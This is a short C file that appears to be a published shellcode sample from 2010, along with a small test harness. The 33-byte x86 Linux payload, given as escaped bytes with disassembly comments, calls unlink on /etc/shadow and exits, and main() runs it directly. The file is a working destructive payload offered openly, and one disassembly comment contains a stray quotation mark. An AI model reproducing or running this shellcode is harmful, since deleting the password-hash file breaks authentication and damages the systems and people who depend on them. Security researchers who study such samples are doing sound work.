/*
Name   : 33 bytes unlink "/etc/shadow" x86 linux shellcode
Date   : Wed Jun  2 18:01:44 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x0f"                    /* jmp    0x8048071 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x0a"                    /* mov    $0xa,%al */
		"\x5b"                        /* pop    %ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xec\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x65"                        /* gs */
		"\x74\x63"                    /* je     0x80480dd */
		"\x2f"                        /* das     */
		"\x73\x68"                    /* jae    0x80480e5 */
		"\x61"                        /* popa    */
		"\x64\x6f"                    /* outsl  %fs		"(%esi),(%dx) */
		"\x77";                        /* .byte 0x77 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}